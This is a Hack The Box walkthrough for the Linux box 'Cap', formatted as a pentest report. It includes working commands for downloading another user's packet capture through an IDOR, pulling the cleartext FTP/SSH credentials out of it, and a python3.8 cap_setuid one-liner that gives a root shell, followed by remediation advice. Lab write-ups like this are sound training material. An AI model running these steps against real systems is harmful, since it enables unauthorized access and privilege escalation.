# Cap — HTB Walkthrough (professional pentest report)

- **Target:** $TARGET
- **Box:** Cap (easy, Linux / Ubuntu 20.04)
- **Date:** 2026-09-30
- **Result:** ✅ Fully compromised — user.txt + root.txt

---

## Summary
Cap runs a Flask "Security Dashboard" (Gunicorn) that generates per-user network
captures. An **IDOR** in `/download/<id>` allows downloading any user's PCAP. Capture
`0` contained **cleartext FTP credentials** (`nathan:Buck3tH4TF0RM3!`), reused for SSH
to get a foothold. Privilege escalation abused the **`cap_setuid` capability on
`/usr/bin/python3.8`** to call `setuid(0)` and execute as root.

---

## 1. Reconnaissance
Full TCP scan + service detection (`nmap -p- -sCV`):

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 80   | HTTP    | Gunicorn — "Security Dashboard" (Python/Flask) |

Evidence: `nmap/allports.txt`, `nmap/services.txt`

## 2. Enumeration (Web)
- App exposes `/capture`, `/ip`, `/netstat`, and report pages at `/data/<id>`.
- `/data/0` and `/data/1` both return **200** while `/capture` binds a report to the
  current session ID → **IDOR**: the `<id>` is user-controlled and unauthenticated.
- `/data/0` links to `/download/0` (a 5-second PCAP capture).

```
/data/0    -> 200
/data/1    -> 200
/download/0 (pcap download)
```

## 3. Foothold / Initial Access
Downloaded capture 0 and extracted FTP auth (cleartext):

```bash
curl -s http://$TARGET/download/0 -o loot/0.pcap
tshark -r loot/0.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg
# USER nathan
# PASS Buck3tH4TF0RM3!
```

Credentials reused over SSH:

```bash
ssh nathan@$TARGET   # password: Buck3tH4TF0RM3!
id  # uid=1001(nathan) gid=1001(nathan)
```

## 4. user.txt
```
[REDACTED-HTB-FLAG]
```

## 5. Privilege Escalation
Linux capabilities enumeration revealed `cap_setuid` on the Python binary:

```bash
/usr/sbin/getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` allows changing UID to 0 without a password (GTFOBins):

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# uid=0(root)
```
(Note: only `cap_setuid` is present, not `cap_setgid`, so `os.setgid(0)` errors —
use `setuid(0)` alone.)

## 6. root.txt
```
[REDACTED-HTB-FLAG]
```

---

## Appendix: Key Commands & Evidence
- `nmap/allports.txt`, `nmap/services.txt` — scans
- `loot/0.pcap` — captured PCAP with creds
- `loot/creds.txt` — recovered credentials
- `web/index.html`, `web/data0.html` — app pages

## Remediation
1. **IDOR:** enforce authorization on `/data/<id>` & `/download/<id>` — bind captures to
   the authenticated session/user and reject IDs the user doesn't own.
2. **Cleartext FTP:** disable plaintext FTP; use FTPS/SFTP so credentials aren't sniffable.
3. **Capabilities:** remove `cap_setuid` from `/usr/bin/python3.8`
   (`setcap -r /usr/bin/python3.8`); never grant setuid capability to interpreters.
4. **Credential hygiene:** rotate `nathan`'s password; don't reuse FTP creds for SSH.
